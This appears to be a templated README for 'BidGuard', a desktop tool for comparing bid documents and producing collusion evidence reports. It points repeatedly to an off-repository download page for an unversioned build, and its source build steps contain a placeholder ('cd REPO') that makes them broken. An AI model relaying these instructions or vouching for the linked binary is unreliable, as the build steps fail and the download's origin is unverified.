# BidGuard - Bid Document Comparison and Collusion Evidence 2026

> **BidGuard is a desktop tool for local tender-document comparison. It helps detect possible similarities and inconsistencies, then produces evidence reports that can be reviewed by procurement and investigation teams. It works with DOCX, PDF, scanned, and Excel files.**

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jamesbrandoneo2630/bidguard-bid-evidence?style=flat-square)](https://github.com/jamesbrandoneo2630/bidguard-bid-evidence)

---

<p align="center">
  <a href="https://jamesbrandoneo2630.github.io/bidguard-bid-evidence/">
    <img src="https://img.shields.io/badge/Download-BidGuard%20Latest-brightgreen?style=for-the-badge" alt="Download BidGuard">
  </a>
</p>

> **[Download BidGuard](https://jamesbrandoneo2630.github.io/bidguard-bid-evidence/)**

---

[Download Latest Build](https://jamesbrandoneo2630.github.io/bidguard-bid-evidence/)

---

## What BidGuard Does

BidGuard gives procurement specialists, auditors, investigators, and analysts a way to examine several bid submissions together. A single analysis can include between two and ten documents, including editable files, PDFs, scanned pages, and spreadsheets.

Its workflow brings together OCR, similarity scoring, visual comparison, and human review controls. These capabilities help surface repeated clauses, contradictory facts, and other possible indicators of collusion. Files are processed on the local desktop, while an optional cloud model download is available for workflows that need additional analysis resources.

---

## Highlights

- Analyze a set of 2 to 10 bid documents at the same time.
- Load DOCX, PDF, scanned-document, and Excel inputs.
- Use OCR to recover text from scanned source material.
- Surface recurring clauses, factual inconsistencies, and potential collusion indicators.
- Apply an eight-step comparison process with weighted similarity ranking.
- Examine similarity matrices and highlighted comparisons between document pairs.
- Accept findings for further consideration or exclude them during manual review.
- Create evidence reports in HTML, Word, Excel, CSV, Markdown, or JSON.
- Keep document processing offline on the local desktop.
- Download an optional cloud model for supported analysis workflows.

---

## Getting Started

### Install a desktop build

Visit the [download page](https://jamesbrandoneo2630.github.io/bidguard-bid-evidence/) to obtain the latest available build. Install it and start BidGuard on your desktop platform.

### Run from source

The application is built with Tauri, React, and Rust. Clone the repository, install its frontend packages, and launch the development build with:

```bash
git clone https://github.com/jamesbrandoneo2630/bidguard-bid-evidence.git
cd REPO
npm install
npm run tauri dev
```

Development scripts can differ between checkouts. If the command above does not match the repository configuration, inspect the project files for the appropriate script.

---

## Typical Workflow

1. Open BidGuard.
2. Create a comparison set containing two to ten bid documents.
3. Import DOCX, PDF, scanned, or Excel files.
4. Run the comparison pipeline.
5. Review the similarity matrix and the ranked document pairs.
6. Use highlighted pairwise views to examine repeated wording and contradictions.
7. Confirm useful findings and exclude items that are not relevant.
8. Export the reviewed evidence in the format needed for your process.

When working with scans, wait for OCR extraction to finish before evaluating the comparison output.

---

## Settings and Data Handling

BidGuard is built for local operation. Its document-analysis controls are therefore available inside the desktop application rather than through a hosted service. Use the interface to choose files, begin analyses, control review states, and select report formats.

If the analysis workflow calls for it, optional cloud model resources may be downloaded. Store original documents and generated reports according to your organization’s document-handling policies.

---

## Requirements

- A desktop environment supported by the distributed Tauri build.
- A functioning Rust and Tauri toolchain when building from source.
- Node.js and npm for the React frontend.
- Adequate local storage for input documents, OCR results, comparison data, and exported reports.
- Extra storage or network connectivity may be required to download optional cloud models.
- Source files in DOCX, PDF, scanned-document, or Excel format.

---

## Frequently Asked Questions

### Which file formats are supported?

BidGuard can work with DOCX, PDF, scanned documents, and Excel files. Scanned inputs can be processed with OCR.

### What is the maximum comparison size?

Each comparison set supports a minimum of two and a maximum of ten bid documents.

### Is BidGuard usable without the internet?

Yes. The main processing workflow is intended to run locally and offline. Internet access may be necessary when downloading an optional cloud model.

### Can a person validate the detected findings?

Yes. Reviewers can inspect the similarity matrix and highlighted pair comparisons, then confirm findings or remove them from consideration.

### What export formats are supported?

BidGuard can generate reports as HTML, Word, Excel, CSV, Markdown, and JSON files.

### How should incomplete OCR output be handled?

Verify that the scanned pages are clear and readable, then import the document again if necessary. Low-quality images, unusual page designs, and indistinct text can reduce extraction quality, so the results should also be checked manually.

### How do I find new builds?

Look at the [latest build](https://jamesbrandoneo2630.github.io/bidguard-bid-evidence/) and visit the repository at [https://github.com/jamesbrandoneo2630/bidguard-bid-evidence](https://github.com/jamesbrandoneo2630/bidguard-bid-evidence) to check for releases and project updates.

### Where should support requests go?

Report reproducible issues through the repository issue tracker. Include the affected file type, the stage of the workflow, and relevant application information. Do not attach confidential tender documents or sensitive evidence.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
